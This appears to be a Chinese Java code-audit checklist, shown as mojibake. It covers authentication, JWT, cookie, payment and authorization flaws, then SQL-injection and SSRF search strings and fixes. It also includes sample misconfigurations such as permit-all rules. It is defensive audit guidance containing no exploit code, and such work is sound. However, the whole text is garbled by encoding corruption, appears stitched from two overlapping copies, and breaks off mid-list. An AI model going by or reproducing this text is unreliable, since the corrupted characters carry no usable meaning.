ãéå¯¹æªææç¨æ·ä¿¡æ¯æ¥è¯¢ä¸è¬æåµä¸ä¸åè®¸å­å¨è¿ç§æ¥å£ï¼è¦æ±é´ææä¸çº¿ã\n\nç»å½éªè¯ä¸å®å¨\n\nå¼±å£ä»¤ç»å½ä¸è¬æå ç§æåµï¼\n\n * ç¨æ·åå¯ç å¨åç«¯æç¤ºæ¡ä¸­æplaceholderççå­\n * ç¨æ·åå¯ç åç«¯éªè¯\n * ç¨æ·åå¯ç åç«¯åæ­»å°ä»£ç ä¸­\n\nè§£å³æ¹æ¡æ¯ä¸åè®¸åç«¯è¿è¡çç¨æ·éªè¯ï¼å¾å¾åç«¯è¿è¡ç¨æ·éªè¯ä¼å¯¹åºåé¢æ´ä¸ªç³»ç»æä½çæªæææèè¶æï¼ï¼ç¨æ·åå¯ç å»ºè®®å­å¨å°æ°æ®åºï¼ä¸åè®¸ç¡¬ç¼ç å°ä»£ç ä¸­éªè¯ï¼åç«¯è¾å¥æ¡æç¤ºä¸­ä¸åè®¸æç¤ºç¨æ·åãå¯ç ä¿¡æ¯ã\n\nbase64ç¼ç ä¼ è¾\n\nä¸ºé²æ­¢ä¸­é´äººæ»å»ï¼å¨åç«¯ç»å½è¯·æ±ä¸­éè¦å¯¹ç¨æ·åå¯ç ï¼å¯ç å¿é¡»å å¯ï¼ä¿¡æ¯è¿è¡å å¯ä¼ è¾ï¼ä½æ¯å¾å¤å¼åè¯¯è®¤ä¸ºbase64æ¯ä¸ç§å å¯æ¹å¼ãè§£å³æ¹æ³æ¯ä½¿ç¨éå¯¹ç§°å å¯çå å¯æ¹å¼ï¼åç«¯ä½¿ç¨å¬é¥è¿è¡å å¯ï¼åç«¯ä½¿ç¨ç§é¥è§£å¯ãæ ¹æ®ç³»ç»æå¤ä½ç½®åéè¦ç¨åº¦ï¼ä¹å¯ä»¥éç¨å¯¹ç§°å¯é¥å å¯ï¼è§æåµèå®ã\n\næ¶æè´¦å·éå®\n\nå¾å¤ç³»ç»å¯¹äºç»å½çç ´æè´¦å·å¤æ¬¡ç»å½çå°å·å¤çæºå¶ï¼è¿ç§æºå¶å®¹æå¯¼è´è´¦å·çæ¶æéå®ï¼æ»å»èåèµ·å¤§éçç»å½è¯·æ±ï¼æ¹ééå®å¤§éè´¦å·ãè§£å³æ¹æ³ï¼\n\n * ç»å½æä½æ·»å éªè¯ç ï¼æé«æ»å»å¤æåº¦\n * å¯¹äºåä¸IPå°åçå¤æ¬¡ç»å½å°è¯è¿è¡IPå°ç¦\n * è®¾ç½®è´¦å·çå¸¸ç¨IPï¼éå¸¸ç¨IPç»å½å¯éªè¯ç»å®ææºçéªè¯ç \n\n# æ³¨éé»è¾\n\næ³¨éæªéæ¯Session\n\nç´æ¥å®ä½å°sessionæ³¨éçæ¥å£ï¼æ¥çæ¯å¦æsession.removeAttribute("user")ç±»ä¼¼çéæ¯æä½ãç»å¸¸åç°å¼åäººåä¸ºäºæ¹ä¾¿ï¼ç´æ¥å¨è¯¥æ¥å£ä¸­è·³è½¬å°äºç»å½é¡µé¢ï¼ä¸è¿è¡ç»å½ä¿¡æ¯çéæ¯ãå¦ææ¯ä½¿ç¨JWTåè®¤è¯çç³»ç»ï¼æ³¨éç»å½å¾å¾æ¯åç«¯çæä½ï¼å³äºJWTçå®å¨æ§é®é¢å¦å¤è®¨è®ºã\n\nä»»æç¨æ·æ³¨é\n\nä»»æç¨æ·æ³¨éæ¯å ä¸ºç¨æ·åèµ·æ³¨éè¯·æ±æ¶ï¼ä¼ å¥äºç¨æ·çèº«ä»½ä¿¡æ¯ï¼å¸¸è§è¯·æ±å°åå¦ï¼/user/logout?userid=10001ï¼æèå°userIdä¿¡æ¯ææè®¾ç½®å¨Cookieä¸­ï¼åªéè¦ä¿®æ¹useridå°±å¯ä»¥æ³¨éå¶ä»ç¨æ·ãè§£å³æ¹æ³æ¯ä¸ä¼ éä»»ä½useridä¿¡æ¯ï¼ç´æ¥ä»è¯·æ±ä¸­è·åsessionï¼è®¾ç½®sessionéæ¯ã\n\n# å¯ç æ¾åé»è¾\n\nä»»æç¨æ·å¯ç éç½®\n\nä»»æç¨æ·å¯ç éç½®å¾å¾æ¯ç±äºæªéªè¯ç¨æ·ææºå·ãé®ç®±ï¼æèç¨æ·ææºå·ãé®ç®±éªè¯å¯ç»è¿ãéªè¯ç å¤æåº¦ä½å¯çç ´ãéå¸¸å¨ä»£ç ä¸­çè¡¨ç°æ¯ç¨æ·å¯ç éç½®éªè¯ææºå·éªè¯ç åéæ°è®¾ç½®å¯ç çè¯·æ±åç¦»ãååæ²¡æå³èæ§ï¼å¯¼è´æ»å»èå¯ä»¥è·³è¿éªè¯æ­¥éª¤ï¼ç´æ¥è¿è¡å¯ç éç½®æä½ãå¯¹äºéªè¯ç çç ´ï¼å¯è®¾ç½®ä¸æ¬¡éªè¯éè¯¯éæ¯ã\n\nå¯ç æ¾åç¨æ·åæä¸¾\n\nå¯ç æ¾åä½ç½®çç¨æ·åæä¸¾åç»å½ä½ç½®çç¨æ·åæä¸¾ç±»ä¼¼ï¼å¨è¿è¡å¯ç æ¾åä¹åéè¦å¤æ­ç¨æ·åæ¯å¦å­å¨ãå¯ä»¥éç¨æ·»å éªè¯ç çæ¹å¼ï¼æèä½¿ç¨ç¨æ·ç»å®çææºå·åéç­ä¿¡éªè¯ç ä½ä¸ºå¯ç æ¾åçä¾æ®ã\n\n# JWTå®å¨é®é¢\n\nJWTæ¶ææ§\n\nå¨çæä¸åJWTTokenä¿¡æ¯æ¶ï¼å¯ä»¥è®¾ç½®JWTçæææ¶é´ï¼æææ¶é´è®¾ç½®ä¸å»ºè®®è¿é¿ãç±äºJWTTokençæä¹åæ ç¶æï¼éå¸¸æåµä¸æå¡å¨ä¸å­å¨JWTTokenä¿¡æ¯ï¼å æ­¤ç±äºJWTçæ¶ææ§é®é¢å¯¼è´ä¿®æ¹ç¨æ·ä¿¡æ¯åï¼JWTåçä¿¡æ¯æ æ³å®æ¶çæ´æ°ï¼å¯è½å¯¼è´è¶æç­çé®é¢ãè§£å³æ¹æ³æ¯æå¡ç«¯å°JWTTokenå­å¨å°Redisä¸­ï¼æ´æ¹ä¿¡æ¯åï¼å°åæ¬çTokenä¿¡æ¯ä»Redisä¸­æ¸é¤ï¼æ¾å¥æ°Tokenï¼æ¯æ¬¡è¯·æ±å¤æ­ç¨æ·æºå¸¦çTokenæ¯å¦å¨ç¼å­ä¸­ã\n\nJWTä¸­åå«ææä¿¡æ¯\n\nJWTæ¯ä¸ä¸²æ.åéçä¸é¨åç»æçå­ç¬¦ä¸²ï¼å¶ä¸­ç¬¬äºé¨åä¸­å¯ä»¥è®¾ç½®ç¨æ·ç¸å³çä¿¡æ¯ï¼è¯¥é¨åä¿¡æ¯ä½¿ç¨base64ç¼ç ãå¦æå¶ä¸­åå«äºä¸äºææçä¸ªäººä¿¡æ¯ï¼å¯ç ãææºå·ãèº«ä»½è¯å·ãé¶è¡å¡å·ç­ï¼å¾å®¹æè¢«ä»äººè·åãå æ­¤ä¸è¦å¨JWTä¸­ä¿å­è¿å¤çä¸ªäººç¸å³ä¿¡æ¯ï¼ä¸è¦å¨JWTä¸­å­å¨ææä¿¡æ¯ã\n\nJWTæªæ ¡éªç­¾å\n\nå¼åäººåå¨è·åJWTä¸­çä¿¡æ¯æ¶éå¸¸ä½¿ç¨çæ¯å¼åäººåç¼åçJWTUtilæèä½¿ç¨ä¸æ¹çJWTå·¥å·ï¼å¨è·åJWTä¿¡æ¯æ¶å¯è½åºç°ä¸éªè¯JWTç­¾åç´æ¥è·åçæåµãæ»å»èå¯ä»¥ä¼ªé JWTç¬¬äºé¨åï¼è¶ææä½ä»äººè´¦å·ãè¿ç§æåµæ¯è¾å°ï¼å·¥ä½ä¸­éå°è¿ä¸æ¬¡ï¼ä½æ¯åç°äºå°±æ¯å¤§é®é¢ã\n\nå¼±å¯é¥çç ´\n\nJWTçå¯é¥å¦æå¤æåº¦ä¸å¤å¯è½å­å¨çç ´çå¯è½ã\n\nJWTæ³¨éçè§£å³æ¹æ¡\n\nå¸¸è§çè§£å³æ¹æ¡å¦ä¸ï¼\n\n * åç«¯æä½ç´æ¥å é¤Tokenï¼æ ä¸ºèæ²»ï¼ä½ä»¤çä»ç¶ææï¼\n * Tokenä½ä¸ºkeyå­å¨å°Redisä¸­ï¼æ³¨éå é¤Token\n * å¨JWTä¸­å­å¨Tokenççæ¬ä¿¡æ¯ï¼Redisä¸­å­å¨JWTçæ¬ä¿¡æ¯åç¨æ·ç»å®ï¼çæ¬ä¸ç¸ååä¸å¯ç¨ï¼æ¹ä¾¿ç¨æ·è¸¢åºä¸çº¿ï¼\n * è®¾ç½®ç­æ¶é´çTokenï¼æ¶é´è¾ç­å¯è½å¯¼è´é¢ç¹ç»å½ï¼\n * é»ååæ ¡éªï¼å¯¹äºæææ³¨éçTokenå å¥é»ååï¼ç¶åæ ¹æ®Tokenè¿ææ¶é´ï¼è¿æåç§»åºé»ååã\n\n# Cookieå®å¨é®é¢\n\nææä¿¡æ¯ä¿®æ¹å¯¼è´è¶æ\n\næäºå¼åäººåå°ç¨æ·èº«ä»½ä¿¡æ¯ãç¨æ·æéä¿¡æ¯ç´æ¥ææå­å¨å°Cookieä¸­ï¼ä¿®æ¹Cookieä¸­çææä¿¡æ¯åï¼ç¶ååç«¯ä»Cookieä¸­è¯»åä¿¡æ¯ï¼å¯¼è´è¶æãä¸å©ç¨Cookieå­å¨æ°æ®ï¼æææ°æ®åå¨æå¡ç«¯å­å¨ã\n\nXSS\n\næ¯è¾å¸¸è§çCookieå®å¨é®é¢ï¼éè¦è®¾ç½®httponlyï¼cookie.setHttpOnly(true);ã\n\nä¸å®å¨çååºåå\n\nShiroå¨Cookieä¸­å å¯å­å¨äºä¿¡æ¯ï¼è§£å¯åååºååãå¦ææ¿å°äºShiroçå¯é¥ï¼åå¯ä»¥æé æ¶æçååºååçå¯¹è±¡ã\n\n\n# æ¯ä»ç¸å³\n\nè¶ææä½è®¢åï¼å¢å æ¹æ¥ï¼\n\nè¶ææä½è®¢åéå¸¸åºç°å¨è®¢åä¸­å¿ä½ç½®ï¼åæ¬æ¥çè®¢åè¯¦æãä¸åãåæ¶è®¢åãå é¤è®¢åãä¿®æ¹è®¢åç­ãä¸»è¦ç¹å¾æ¯æå¡ç«¯ä½¿ç¨ç¨æ·ä¼ å¥çorderIdåä¸å­æ®µè¿è¡æä½ï¼æªå¤æ­å½åorderIdæ¯å¦å±äºå½åç¨æ·ãéå¸¸åæ³æ¯è·åå°orderIdä¹åï¼ä»ç¨æ·ä¿¡æ¯ä¸­åuserIdï¼ç¶åä½¿ç¨ä¸¤ä¸ªå­æ®µæä½æ°æ®åºã\n\néé¢é®é¢ï¼0.01æ¯ä»ãè´ä»¶æ°ååãæ´»å¨ä¼æ èç¾æ¯ï¼\n\néé¢é®é¢æ¯è¾å¤æï¼å¦ææ¶åå°ç§¯åãä¼æ ãçº¢åãæ»¡åç­ç¹æ®æ´»å¨ï¼éè¦ååäºè§£æ´»å¨çæºå¶ãæ´»å¨å¯¹è±¡çè¦æ±ãè¿é¨ååä¸å¡ç´§å¯èç³»ï¼ä¾å¦ï¼ç§¯åä¸å¡åæ¯ä»ä¸å¡åç¦»ï¼å½ç¨æ·åèµ·éæ¬¾åï¼ç§¯åæªéæ¬¾ï¼å æ­¤å¯ä»¥å·åç§¯åç­ãå¯¹äº0.01ãè´æ°éååç­éè¦çä»£ç ä¸­æ»éé¢çè®¡ç®æ¹å¼æ¯å¦åçï¼æ¯å¦å¯¹ååæ°éåæ ¡éªï¼æ»éé¢ä¸è¦ä»åå°ä¼ å¥ï¼ç±åå°è®¡ç®è·åã\n\nå¯¹äºæäºåªè½åä¸ä¸æ¬¡çæåµï¼éè¦å¯¹å³é®æä½å éï¼é²æ­¢æ¡ä»¶ç«äºå¹¶åèç¾æ¯ã\n\n\n# æéç¸å³\n\næªææè®¿é®\n\nå¨ä½¿ç¨æäºæéæ§å¶æ¡æ¶æ¶ï¼å¼åäººåä¸ºäºå¼åçæ¹ä¾¿ï¼ç´æ¥è®¾ç½®äºå¨é¨æ¥å£çåè®¸è®¿é®ï¼æè®¾ç½®äºå¼åçæ¥å£URLåè®¸è®¿é®ï¼ï¼åæå¼åå®æ¯ä¹åå¿è®°ä¿®æ¹ï¼å¯¼è´æªææãæèå¨ä½¿ç¨æ³¨è§£è¿è¡æéæ§å¶æ¶ï¼å¿è®°ç»æäºæ¹æ³ä¸æ·»å æ³¨è§£ï¼é½å¯è½å¯¼è´æªææè®¿é®ã\n\n// shiro\nmap.put("/**","anon");\n//spring security\n.anyRequest().permitAll() \n\n\n1\n2\n3\n4\n\n\nè¿æä¸ç§æåµæ¯å¼åèèªå·±å¼åäºæ¦æªå¨ï¼å½æ»¡è¶³æäºæ¡ä»¶ï¼è¯·æ±å¤´åå«æä¸ªå­æ®µãè¯·æ±URLå°åä»¥xxå¼å¤´ç­ï¼ä¸éè¦è®¤è¯ï¼ä¹æå¯è½åºç°æªææè®¿é®çé®é¢ã\n\nè¶ææä½\n\nè¶ææä½åè®¢åè¶æç±»ä¼¼ï¼å³é®ç¹å¾é½æ¯ä¿¡ä»»åç«¯ä¼ å¥çidåæ°ï¼ç´æ¥å©ç¨idè¿è¡æ¥è¯¢ç­æä½ã\n\nä¿¡ä»»Cookieä¸­è®¾ç½®çRoleName=adminï¼ä¹å¯è½å¯¼è´åç´è¶æé®é¢ã\n\næ°¸è¿ä¸ç¸ä¿¡åå°ä¼ å¥çæ°æ®ï¼å¯¹äºå³é®çæ°æ®ï¼userIdãroleIdï¼ç­ï¼ç±æå¡ç«¯è·åã\n\n\n# éçé®é¢\n\n# åå²éçæ¥å£\n\nåå²éçæ¥å£åå«åºä¸çº¿ä½æ¯æªä¸çº¿çæ¥å£ãæ ç¨åè½ãå°æçæ´»å¨ç­ãå¼åå¨ä¿®å¤æ¼æ´æ¶å¯è½ä¼éæ°å¼ä¸ä¸ªæ°çæ¥å£ï¼ä½æ¯å­å¨é®é¢çæ¥å£å¯è½ä»ç¶å­å¨æªä¸çº¿ãè¿ç¹å¨ç§»å¨ç«¯æ¯è¾å¸¸è§ï¼æè®¸å ä¸ºå¼å®¹èçæ¬APPï¼å¯¼è´å­å¨é®é¢çæ¥å£ä»ç¶å­å¨ãè¿ç§é®é¢çåç°ä¾èµäºå¯¹äºç³»ç»çäºè§£ç¨åº¦åæ¥å£çç®¡çæ°´å¹³ãå¹³æ¶å¨å®¡è®¡æ¶ï¼å¤å³æ³¨åæä»¶çå¶ä»æ¥å£ã\n\n# æµè¯ï¼åé¨ï¼å¯¹å¤æ´é²\n\nå¼åä¸ºäºæµè¯æ¹ä¾¿ç´æ¥çå­æéè¾å¤§çåé¨ãåæ¬æ°æ®åºæä½ãæä»¶æä½ãredisæä½ç­ãè¿æä¸äºæ¥å£ç¨äºçææµè¯æ°æ®ãæ·»å æµè¯ç¨æ·ï¼å è§£å¯ç­æä½ãè¿ç±»æ¥å£å¯¹å¤å¼æ¾ï¼æå¾å¤§çå®å¨éæ£ãæ¥å£åç§°å¤ä¸º/test/xxxæè/encryptã/decryptç­ãä¸è¬ä¸åè®¸æè¿ç±»æ¥å£æªææå¯¹å¤å¼æ¾ã\n\n\n# éªè¯ç ç±»\n\néªè¯ç çé®é¢ä¸»è¦åå«å¤æåº¦ä½ãéªè¯ç éç¨ãéªè¯ç å¯ç»è¿ãç­ä¿¡ï¼çµè¯ï¼è½°ç¸ãä¸åä¸å¡ç­ä¿¡éªè¯ç å±ç¨ç­ã\n\néªè¯ç åä¸¤ç±»ï¼ç­ä¿¡ï¼çµè¯ï¼éªè¯ç åäººæºäº¤äºéªè¯ç ãæ»ä½æ¥è¯´åºæ»¡è¶³å¦ä¸çè¦æ±ï¼\n\n * éªè¯ç å¤æåº¦é«\n * éªè¯ç å¤æ¬¡å°è¯éæ¯\n * ä½¿ç¨è¿çç­ä¿¡ï¼çµè¯ï¼éªè¯ç éæ¯\n * æ¯å¦æéªè¯ç ä¸å¯éè¿åå°æ§å¶\n * å¾å½¢éªè¯ç å°½éå¤æä¸å¯è¢«è¯å«\n * å¾å½¢éªè¯ç å¾çå¤§å°ä¸å¯è¢«åå°æ§å¶\n * ç­ä¿¡ï¼çµè¯ï¼éªè¯ç è¦æéå¯¹ææºå·ãä¼è¯ãIPç­å¤ç§é²è½°ç¸çæºå¶ï¼ä¸åä¸å¡é²è½°ç¸ä¿¡æ¯åæ­¥ã\n * ä¸åä¸å¡çç­ä¿¡éªè¯ç å°½éä¸éç¨\n * â¦â¦\n\n\n# ä¸æ¹ç»ä»¶æ¼æ´å®¡è®¡æ¹å¼\n\n * ä¾é äººå·¥æ¥çé¡¹ç®ä¸­ä½¿ç¨çä¾èµ\n   \n   * ä¼ç¹ï¼ä¸éè¦åå©å·¥å·ï¼ä»£ç å®¡è®¡çæ¶åè¿ä¸ä¸ä¾èµåï¼å¯¹äºå¼å¥äºç¸å³ä¾èµä½æªä½¿ç¨çæåµæ¯è¾åç¡®ãå¯ä»¥å¯¹æ¼æ´å·ä½çä½¿ç¨æ¡ä»¶è¿è¡å¤æ­ã\n   * ç¼ºç¹ï¼ä¾èµä¸ªäººç»éªï¼å®¹æéæ¼ï¼\n\n * éè¿ä¸äºç¬¬ä¸æ¹ä¾èµæ£æ¥åè½\n   \n   * ä¼ç¹ï¼å¨é¢ãéåº¦å¿«ãæ´æ°åæ¶\n   * ç¼ºç¹ï¼ä¸å¤åç¡®\n\n * èªå·±å¼åå·¥å·\n   \n   * ä¼ç¹ï¼é¡ºæï¼å¯æ ¹æ®èªå·±çæ³æ³æ¹è¿ï¼æåå®å¨å·¥å·å¼åçè½åï¼\n   * ç¼ºç¹ï¼éå¤é è½®å­ï¼å¼ååç»´æ¤çææ¬è¾é«ï¼ï¼å¦ææ¯å©ç¨ç¬¬ä¸æ¹æ¥å£çæ¹å¼ï¼åæ¥å£æ´æ¹ï¼å¯¹åºé»è¾ä¹è¦æ´æ¹ãå¦ææ¯èªå·±å¼åæ¥å£ï¼åä¾èµç»ä»¶æ¼æ´ä¿¡æ¯çç®¡çåæ¶éï¼\n   * æè·¯ï¼éè¿è§£æpom.xmlæä»¶ï¼è·åå¨é¨å¼å¥çä¾èµï¼è°ç¨æ¥å£å¤æ­æ¯å¦å­å¨æ¼æ´ã\n\n\n# åèèµæ\n\n 1. æ±¡ç¹åæææ¯çåçåå®è·µåºç¨\n 2. JAVAä»£ç å®¡è®¡ä¹XXEä¸SSRF\n 3. æ»å»JWTçä¸äºæ¹æ³\n 4. æµè°CookieåCookieå®å¨',normalizedContent:'å¥½ä¹æ²¡æ´æ°äºï¼åä¸ç¯checklistã\n\n\n# æ¦è¿°\n\n\n# ä»ä¹æ¯ä»£ç å®¡è®¡ï¼\n\nè°ï¼ä»£ç å®¡è®¡å¼å¾æ¯å·æå®å¨åå¼åç»éªçäººå\n\nå¯¹è±¡ï¼éè¯»ç¨åºæºä»£ç æèç»è¿åç¼è¯ä¹åçä»£ç \n\nææ®µï¼åå©èªå¨åä»£ç åæå·¥å·æèäººå·¥éè¯»çæ¹å¼\n\nç®çï¼åç°ç³»ç»ä»£ç ä¸­å­å¨çå®å¨é£é©åè®¾è®¡ç¼ºé·ï¼å¼å¯¼å¼åäººåä¿®å¤ï¼ä¿éç³»ç»è¿è¡å®å¨ã\n\n\n# æ±¡ç¹åæåç\n\næ±¡ç¹åææ¯ä¸ç§è·è¸ªå¹¶åææ±¡ç¹ä¿¡æ¯å¨ç¨åºä¸­æµå¨çææ¯ãå¨æ¼æ´åæä¸­éå¸¸å°æ±¡ç¹åææ½è±¡æä¸ä¸ªä¸åç»çè¡¨ç¤ºæ¹å¼<sources,sinks,sanitizers>çå½¢å¼ï¼\n\n * sources: æ±¡ç¹æºï¼ç´æ¥å¼å¥å¯¼è´å±é©åççä¸ä¿¡ä»»æ°æ®çä½ç½®ï¼ä»¥sqlæ³¨å¥ä¸ºä¾ï¼id=1å­å¨sqlæ³¨å¥ï¼æ±¡ç¹æºä¸ºidåæ°ï¼\n * sinks: æ±¡ç¹æ±èç¹ï¼ç´æ¥è¿è¡å±é©æä½æèéç§æ³é²å°å¤ççä½ç½®ï¼ä»¥sqlæ³¨å¥ä¸ºä¾ï¼æ±¡ææ±èç¹ä¸ºexecutequery()ç¸å³è°ç¨æ§è¡sqlè¯­å¥çä½ç½®ï¼\n * sanitizers: æ å®³åå¤çï¼ä½¿ç¨è½¬ä¹ãè¿æ»¤ãé»æ­ãå å¯ç­ææ®µä¸åå¯¹ç³»ç»å®å¨äº§çå±å®³çä½ç½®ï¼ä»¥sqlæ³¨å¥ä¸ºä¾ï¼æ å®³åå¤çæçæ¯sqlè¯­å¥çè¿æ»¤ä½ç½®ãæèsqlè¯­å¥äº§çç»æçå¤æ­ä½ç½®ï¼ä¸å®å¨ï¼ã\n\n\n\næ±¡ç¹åæå°±æ¯åæç¨åºä¸­æ¯å¦å­å¨æªç»è¿æ å®³åå¤ççæ±¡ææºéè¿ä¼ æ­è·¯å¾å°è¾¾æ±¡ç¹æ±èç¹ï¼å¯¹ç³»ç»äº§çå±å®³ãæ±¡ç¹åæå¯ä»¥åæä»¥ä¸çå ä¸ªé¶æ®µï¼\n\n 1. å¤æ­åä¸¾æ±¡ç¹æ±èç¹ï¼\n 2. å¯»æ¾å°æ±¡ææ±èç¹å¯¹åºåæ°çæ±¡ç¹æ¥æºï¼\n 3. å¤æ­ä»æ±¡ç¹æºå°äºç¹æ±èç¹æ¯å¦å­å¨å¯è½çéè·¯ï¼\n 4. å¤æ­æ¯å¦å­å¨æ å®³åå¤çãæ å®³åå¤çæ¯å¦è½å¤å®å¨å¤çæ±¡ç¹æºæ°æ®çæææåµã\n\næ±¡ç¹åææ¯ä¿¡æ¯æµåæææ¯ä¸­çä¸ç§å®è·µçææ¯ï¼å¹¿æ³åºç¨äºéæåæå®å¨æµè¯ä¸­ï¼æ¯å¯¹äººå·¥ä»£ç å®¡è®¡çä¸ç§æ½è±¡ãå ä¹ææçæ¼æ´é½å¯ä»¥æç§æ±¡ç¹åæçæ¹å¼åç°ï¼ä½æ¯åæçå¤æåº¦å¹¶ä¸ç¸åãå¯¹äºsqlç­å¸¸è§çæ¼æ´ï¼æ±¡ç¹æ±èç¹ï¼å±é©å½æ°ï¼åä¸ä¸å®¹æåç°ï¼ç¸å¯¹æ¥è¯´åæèµ·æ¥æ¯è¾å®¹æï¼ä½æ¯å¯¹äºé»è¾æ¼æ´ãä¿¡æ¯æ³é²ãxssç­æ¼æ´è¦çèå´å¹¿ãäº§çæåµå¤æãæ²¡æåç¡®çå±é©å½æ°ï¼ç½çåç°è¾ä¸ºå°é¾ä¸åç¡®åº¦ä¸é«ã\n\n\n# ä»£ç å®¡è®¡æµç¨\n\næ©æçä»£ç å®¡è®¡ç±äºç®æ ç³»ç»è§æ¨¡å°ãä»£ç éè¾å°ãä»£ç ä¹é´çé»è¾è°ç¨å³ç³»ç®åæ¸æ°ï¼ä½¿ç¨äººå·¥å®¡è®¡çæ¹å¼å°±å¯ä»¥è¦çæ´ä¸ªç³»ç»äºãäººå·¥ä»£ç å®¡è®¡éå¸¸æä¸ç§æè·¯ï¼\n\n * å¨æéè¯»äºè§£ä»£ç æ¯é¨åçåè½ä»¥åæ°æ®æµåï¼ç»åå·ä½çåè½ç¹åç°ä»£ç ä¸­å­å¨çé®é¢ãè¿ç§æ¹å¼å¨é¢ä½æ¯èæ¶èåï¼\n * å±é©å½æ°å®ä½æ³ï¼éè¿å®ä½ä¸é¢æå°çsinksï¼æ¾å°å±é©å½æ°ä¹ååä¸ææ¥ï¼çå±é©å½æ°æ°æ®æ¥æºï¼æ¯å¦å­å¨æ å®³åå¤çï¼è¿ç§æ¹å¼å¿«æ·æ¹ä¾¿ï¼ä½ä¸å¨é¢ï¼å¯¹é»è¾æ¼æ´æ²¡æåç°çè½åï¼\n * å¯¹å·ä½çåè½ç¹è¿è¡å»ºæ¨¡åå®¡è®¡ï¼æ ¹æ®éæ±ææ¡£æèåä¸çåè½ç¹ï¼åæå¯è½åºç°çé£é©é¡¹ï¼éæ¡ææ¥ãéåº¦è¾å¿«ï¼å¯¹é»è¾æ¼æ´ä¹è½å¾å¥½çææ¡ãææ¥ææåå³äºå®å¨äººåçå¨èå»ºæ¨¡è½ååå¯¹ç®æ çäºè§£ç¨åº¦ã\n\nç±äºç®æ é¡¹ç®å¨åå±çè¿ç¨ä¸­éæ¸å¤æåä»¥åä»£ç éçææ°çº§å¢é¿ï¼ç³»ç»åç³»ç»ä¹é´è°ç¨å³ç³»å¤æï¼äººå·¥å®¡è®¡çæ¹å¼å·²ç»æ æ³åå°å¨é¢çå®¡è®¡ãä¸äºå¯¹åºçå·¥å·ä»å¥ï¼æå¤§çæé«äºä»£ç å®¡è®¡äººåçå·¥ä½æçãéæä»£ç å®¡è®¡å·¥å·åçåå±å¦ä¸ï¼\n\n * å³é®å­çå¹é\n * åºäºastä»£ç åæ\n * åºäºir/cfgçä»£ç åæ\n * qlæ¦å¿µ\n\n\n# å¸¸ç¨å·¥å·\n\n * ç¨çé¡ºæçç¼è¾å¨\n   * ideaãvscodeãeclipseç­\n * åç¼è¯å·¥å·\n   * jd-guiãjadxãwja(æå¨æè°è¯çåè½)ç­\n * èªå¨åä»£ç å®¡è®¡å·¥å·\n   * checkmarxãseayãfortify scaãæ¾å«å¥ãcodesecç­\n * å¶ä»\n   * codeqlãsootãdependencycheckãysoserialãjndi-injection-exploitç­\n\n\n# åºç¡æ¼æ´å®¡è®¡æ¹å¼\n\n\n# sqlæ³¨å¥\n\n> åçï¼æ»å»èå¨å¯å©ç¨çä½ç½®æå¥æ¶æçsqlè¯­å¥ï¼ä½¿åæ¬çsqlè¯­å¥äº§çæ­§ä¹ï¼ä»èè¾¾å°æ»å»èæçºµæ°æ®åºçç®çã\n\n# ä»£ç æç´¢èå´\n\n*ã*mapper.xmlã*.javaã*.xml(å°é¨åå¼åäººåmapperæä»¶ç¼åä¸è§è)\n\n# æç´¢å­ç¬¦ä¸²åå®¹\n\nstring sql = "\n@select\n@update\n@delete\n@insert\n"select\n"update\n"insert\n"delete\n${sql}\n${\n.executequery(\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# å¤æ­ä¾æ®\n\n 1. åçjdbcæ¯å¦å­å¨ç´æ¥æ¼æ¥sqlè¯­å¥ï¼ä½¿ç¨+ï¼æèä½¿ç¨stringbuilder append()ï¼ï¼æªç»è¿é¢ç¼è¯ï¼\n 2. mybatisä½¿ç¨${}ï¼\n 3. hibernateãjpaé»è®¤æ¯ç»è¿é¢ç¼è¯çï¼ä½æ¯å¦æå¼åèªå·±ç¼åçsqlè¯­å¥ï¼ä¹éè¦è¿è¡æ£æ¥ï¼\n 4. javaæ¯å¼ºç±»åè¯­è¨ï¼å½æ³¨å¥åæ°ä¸ºlongãintç­æ°å­ç±»åæ¶æ æ³è¿è¡æ³¨å¥ï¼\n 5. æ¾å°å±é©å½æ°ä½ç½®ä¹åï¼åä¸æç´¢ï¼æ¾å½æ°ãæ¹æ³è°ç¨ä½ç½®ï¼ç´å°è¯·æ±å¥å£ï¼controllerå±ï¼ï¼å¤æ­æ¯å¦å­å¨æ å®³åå¤çãæ å®³åå¤çæ¯å¦ä¸¥æ ¼ï¼\n 6. æ³¨æå¼åå¯è½è®¾ç½®å¨å±è¿æ»¤ã\n\n# ä¿®å¤æ¹å¼\n\n 1. åæ°åºå®ä¸ºæ°å­ç±»åæ¶ï¼ä½¿ç¨æ°å­ç±»åæ¥æ¶ï¼æèè½¬ä¸ºæ°å­ç±»åï¼\n 2. é¢ç¼è¯ï¼åçjdbcä½¿ç¨?åæ°å ä½ï¼ä¹åä½¿ç¨.preparedstatementï¼mybatisä½¿ç¨#{}æ¿æ¢${}ï¼\n 3. å¯¹äºmybatisä¸­æ æ³ä½¿ç¨#{}çåºæ¯ï¼\n    * likeï¼ä½¿ç¨concat(\'%\',#{},\'%\')\n    * inï¼ä½¿ç¨<foreach\n    * order byï¼ä»£ç ä¸åç½åå\n 4. è®¾ç½®è¿æ»¤å¨ï¼ä¸¥æ ¼éå¶ä¼ å¥åæ°\n\n\n# ssrf\n\n> åçï¼ssrf(server-side request forge, æå¡ç«¯è¯·æ±ä¼ªé )ï¼æ»å»èå©ç¨æ¼æ´è®©æå¡ç«¯åèµ·æå®çè¯·æ±ãssrfæ»å»çç®æ ä¸è¬æ¯ä»å¤ç½æ æ³è®¿é®çåç½ç³»ç»ã\n> \n> javaä¸­çssrfæ¯æçåè®®ï¼httpãhttpsãfileãftpãmailtoãjarãnetãdocãå¨javaä¸­ssrfçå©ç¨å±éè¾å¤§ï¼ä¸è¬å©ç¨httpåè®®æ¥æ¢æµç«¯å£ï¼å©ç¨fileåè®®è¯»åä»»ææä»¶ã\n\n# ä»£ç æç´¢èå´\n\n*ã*.java\n\n# æç´¢å­ç¬¦ä¸²åå®¹\n\nnew url(\nurlconnection\nrequest.*.execute\nimageio.read(\nhttpclient\nclienthttprequest\nresttemplate\n.postforobject\n.getforobject\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# å¤æ­ä¾æ®\n\n 1. è¯¥æ¼æ´ç»å¸¸åºç°å¨å®¢æ·ç«¯ä¼ å¥æä»¶ãå¾ççurlå°åï¼éå¸¸å­å¨å¨nasãossä¸ï¼éè¿urlè·åç¸å³çæä»¶æèå½åè¯·æ±éè¦è®¿é®å¶ä»è¯·æ±ï¼è¯·æ±å°åç±å®¢æ·ç«¯ä¼ å¥ï¼\n 2. 